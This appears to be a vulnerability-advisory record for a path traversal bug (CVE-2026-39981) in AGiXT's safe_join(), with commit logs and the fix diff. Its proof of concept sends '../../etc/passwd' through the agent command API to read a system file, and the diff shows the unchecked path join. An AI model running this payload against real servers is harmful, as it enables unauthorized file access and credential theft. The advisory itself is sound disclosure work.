# GHSA-5GFJ-64GH-MGMW

repo: Josh-XT/AGiXT

summary: AGiXT Vulnerable to Path Traversal in safe_join()

aliases: ['CVE-2026-39981']

severity: HIGH

evidence: file_history blamed_lines=0 files=['agixt/extensions/essential_abilities.py']

intro: 569fa2ccfc89779705388da5dffd2c2f66d4894d

intro_subject: Handle executions during answer (#1614)

intro_date: 2025-12-12T21:30:24-05:00

fix: 2079ea5a88fa671a921bf0b5eba887a5a1b73d5f

affected: [
  {
    "package": {
      "ecosystem": "PyPI",
      "name": "agixt"
    },
    "ranges": [
      {
        "type": "ECOSYSTEM",
        "events": [
          {
            "introduced": "0"
          },
          {
            "fixed": "1.9.2"
          }
        ]
      }
    ],
    "database_specific": {
      "last_known_affected_version_range": "<= 1.9.1"
    }
  }
]

DETAILS:
### Summary
The safe_join() function in the essential_abilities extension fails to validate that resolved file paths remain within the designated agent workspace. An authenticated attacker can use directory traversal sequences to read, write, or delete arbitrary files on the server hosting the AGiXT instance.

### Details
`agixt/endpoints/Extension.py:165` (source) -> `agixt/XT.py:1035` (hop) -> `agixt/extensions/essential_abilities.py:436` (sink)

```python
# source
command_args = command.command_args

# hop
response = await Extensions(...).execute_command(command_name=command_name, command_args=command_args)

# sink
new_path = os.path.normpath(os.path.join(self.WORKING_DIRECTORY, *paths.split("/")))
```
### PoC
 
```python
# tested on: agixt<=1.9.1
# install: pip install agixt==1.9.1
 
import requests
 
BASE = "http://localhost:7437"
TOKEN = "<your_api_key>"
 
headers = {"Authorization": f"Bearer {TOKEN}"}
 
payload = {
    "command_name": "read_file",
    "command_args": {
        "filename": "../../etc/passwd"
    }
}
 
r = requests.post(f"{BASE}/api/agent/MyAgent/command", json=payload, headers=headers)
print(r.text)
# expected output: root:x:0:0:root:/root:/bin/bash ...
```
 
### Impact
 
Authenticated users can read, overwrite, or delete arbitrary files on the host server, enabling credential theft, persistent code execution, or denial of service. Authentication is required but no elevated privileges are needed beyond a valid API key.

REFS:
- WEB https://github.com/Josh-XT/AGiXT/security/advisories/GHSA-5gfj-64gh-mgmw
- ADVISORY https://nvd.nist.gov/vuln/detail/CVE-2026-39981
- WEB https://github.com/Josh-XT/AGiXT/commit/2079ea5a88fa671a921bf0b5eba887a5a1b73d5f
- PACKAGE https://github.com/Josh-XT/AGiXT
- WEB https://github.com/Josh-XT/AGiXT/releases/tag/v1.9.2

INTRO_LOG:
569fa2ccfc89779705388da5dffd2c2f66d4894d
Josh XT <102809327+Josh-XT@users.noreply.github.com>
2025-12-12T21:30:24-05:00
Handle executions during answer (#1614)

* Handle executions during answer

* add parent activity and improve workspace local file handling

* Updates

* update se

* improve csv handling

* improve non streaming pipeline

* add save to memory flag

* improve continue logic and streaming

* speed up rename

* cleaner rename strategy

* Potential fix for code scanning alert no. 407: Uncontrolled data used in path expression

Co-authored-by: Copilot Autofix powered by AI <62310815+github-advanced-security[bot]@users.noreply.github.com>
Signed-off-by: Josh XT <102809327+Josh-XT@users.noreply.github.com>

* update safeexecute

* Potential fix for code scanning alert no. 408: Uncontrolled data used in path expression

Co-authored-by: Copilot Autofix powered by AI <62310815+github-advanced-security[bot]@users.noreply.github.com>
Signed-off-by: Josh XT <102809327+Josh-XT@users.noreply.github.com>

* lint

* fix learn file

---------

Signed-off-by: Josh XT <102809327+Josh-XT@users.noreply.github.com>
Co-authored-by: Copilot Autofix powered by AI <62310815+github-advanced-security[bot]@users.noreply.github.com>


INTRO_STAT:
 agixt/Agent.py                            |  123 +-
 agixt/Conversations.py                    |   96 +-
 agixt/Extensions.py                       |    6 +-
 agixt/Interactions.py                     | 2067 +++++++++++++++++------------
 agixt/InternalClient.py                   |   20 +-
 agixt/Workspaces.py                       |   51 +-
 agixt/XT.py                               |  564 ++++++--
 agixt/endpoints/GQL.py                    |    1 +
 agixt/endpoints/Legacy.py                 |    1 +
 agixt/endpoints/Memory.py                 |    1 +
 agixt/extensions/essential_abilities.py   |  137 +-
 agixt/prompts/Default/Select Commands.txt |   27 +
 agixt/providers/ezlocalai.py              |    7 +
 agixt/providers/openai.py                 |    1 -
 agixt/providers/rotation.py               |    6 +
 docker-requirements.txt                   |    2 +-
 requirements.txt                          |    2 +-
 17 files changed, 2117 insertions(+), 995 deletions(-)


INTRO_DIFF_OVERLAP:
diff --git a/agixt/extensions/essential_abilities.py b/agixt/extensions/essential_abilities.py
index 25a02d3e..ed3daf57 100644
--- a/agixt/extensions/essential_abilities.py
+++ b/agixt/extensions/essential_abilities.py
@@ -191,6 +191,7 @@ class essential_abilities(Extensions, ExtensionDatabaseMixin):
             "View Image": self.view_image,
             "Get Web UI Tips": self.get_webui_tips,
             "Create AGiXT Agent": self.create_new_agixt_agent,
+            "Optimize Command Selection": self.optimize_command_selection,
         }
         self.WORKING_DIRECTORY = (
             kwargs["conversation_directory"]
@@ -418,18 +419,28 @@ class essential_abilities(Extensions, ExtensionDatabaseMixin):
         line_end: str,
     ) -> str:
         """
-        Read a file in the workspace, optionally reading only specific line ranges
+        Read a file in the workspace, optionally reading only specific line ranges.
+
+        **IMPORTANT**: This command returns a maximum of 100 lines at a time to manage context size.
+        If a file is larger than 100 lines, it will be truncated and you will need to make additional
+        calls with different line ranges to see the full content.
 
         Args:
         filename (str): The name of the file to read
         line_start (int): The starting line number (1-indexed). If "None", starts from beginning
-        line_end (int): The ending line number (1-indexed, inclusive). If "None", reads to end
+        line_end (int): The ending line number (1-indexed, inclusive). If "None", reads to end (max 100 lines)
 
         Returns:
         str: The content of the file or specified line range
 
-        Notes: This command will only work in the agent's designated workspace. The agent's workspace may contain files uploaded by the user or files saved by the agent that will be available to the user to download and access. The user can browse the agents workspace by clicking the folder icon in their chat input bar.
+        Notes:
+        - This command will only work in the agent's designated workspace
+        - The agent's workspace may contain files uploaded by the user or files saved by the agent
+        - The user can browse the agents workspace by clicking the folder icon in their chat input bar
+        - For large files or data analysis, consider using Execute Python Code to extract specific information
+        - For CSV/data files, use Execute Python Code with pandas to analyze data efficiently
         """
+        MAX_LINES = 100  # Maximum lines to return per read
         try:
             line_start = int(line_start)
         except:
@@ -441,34 +452,69 @@ class essential_abilities(Extensions, ExtensionDatabaseMixin):
         try:
             filepath = self.safe_join(filename)
 
-            # Read the entire file or specific lines
+            # Read the file lines
             with open(filepath, "r", encoding="utf-8") as f:
-                if line_start is None and line_end is None:
-                    # Read entire file
-                    content = f.read()
-                else:
-                    # Read specific line range
-                    lines = f.readlines()
-                    total_lines = len(lines)
-
-                    # Convert to 0-indexed and handle bounds
-                    start_idx = 0 if line_start is None else max(0, line_start - 1)
-                    end_idx = (
-                        total_lines if line_end is None else min(total_lines, line_end)
-                    )
+                lines = f.readlines()
+
+            total_lines = len(lines)
 
-                    # Extract the requested lines
-                    selected_lines = lines[start_idx:end_idx]
-                    content = "".join(selected_lines)
+            # Determine start and end indices
+            start_idx = 0 if line_start is None else max(0, line_start - 1)
 
-                    # Add line number information if reading a range
-            

FIX_LOG:
2079ea5a88fa671a921bf0b5eba887a5a1b73d5f
Josh XT <josh@devxt.com>
2026-03-15T00:58:47-04:00
v1.9.2




FIX_STAT:
 agixt/extensions/essential_abilities.py | 17 ++++++++++++++---
 agixt/version                           |  2 +-
 2 files changed, 15 insertions(+), 4 deletions(-)


FIX_DIFF_OVERLAP:
diff --git a/agixt/extensions/essential_abilities.py b/agixt/extensions/essential_abilities.py
index 84a050bf..6630e0cd 100644
--- a/agixt/extensions/essential_abilities.py
+++ b/agixt/extensions/essential_abilities.py
@@ -423,19 +423,30 @@ class essential_abilities(Extensions, ExtensionDatabaseMixin):
 
     def safe_join(self, paths) -> str:
         """
-        Safely join paths together
+        Safely join paths together, ensuring the result stays within
+        the agent's WORKING_DIRECTORY to prevent path traversal attacks.
 
         Args:
         paths (str): The paths to join
 
         Returns:
         str: The joined path
+
+        Raises:
+        PermissionError: If the resolved path escapes WORKING_DIRECTORY
         """
         if "/path/to/" in paths:
             paths = paths.replace("/path/to/", "")
-        new_path = os.path.normpath(
-            os.path.join(self.WORKING_DIRECTORY, *paths.split("/"))
+        # Use realpath (not just normpath) to resolve symlinks and ..
+        base = os.path.realpath(self.WORKING_DIRECTORY)
+        new_path = os.path.realpath(
+            os.path.normpath(os.path.join(self.WORKING_DIRECTORY, *paths.split("/")))
         )
+        # Verify the resolved path is within the workspace
+        if not (new_path.startswith(base + os.sep) or new_path == base):
+            raise PermissionError(
+                f"Path traversal detected: refusing to access path outside workspace"
+            )
         path_dir = os.path.dirname(new_path)
         os.makedirs(path_dir, exist_ok=True)
         return new_path


intro_is_ancestor_of_fix: True

tags_contain_intro_sample: []

tags_contain_fix_sample: []

tags_with_intro_not_fix_sample: []